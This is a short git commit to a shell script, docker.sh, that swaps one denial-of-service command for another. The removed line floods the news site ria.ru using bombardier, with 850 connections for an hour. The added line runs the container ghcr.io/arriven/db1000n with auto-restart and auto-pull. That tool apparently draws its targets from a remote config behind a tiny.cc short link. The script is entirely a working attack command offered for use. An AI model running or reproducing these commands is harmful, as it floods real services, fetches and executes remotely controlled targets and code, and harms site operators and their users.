5c7e00db194b2996cb30d7fe48f7cb1e1469e966
andriipanchuk <59779099+andriipanchuk@users.noreply.github.com>
2022-03-07 10:36:29 -0600

    Update docker.sh

--- docker.sh
+++ docker.sh
@@ -1,5 +1,5 @@
 #!/usr/bin/env bash
 
-docker run -d --rm alpine/bombardier -c 850 -d 3600s -l https://ria.ru
+docker run -d --restart always --rm --pull always ghcr.io/arriven/db1000n ./main -c https://tiny.cc/kbull
 
 
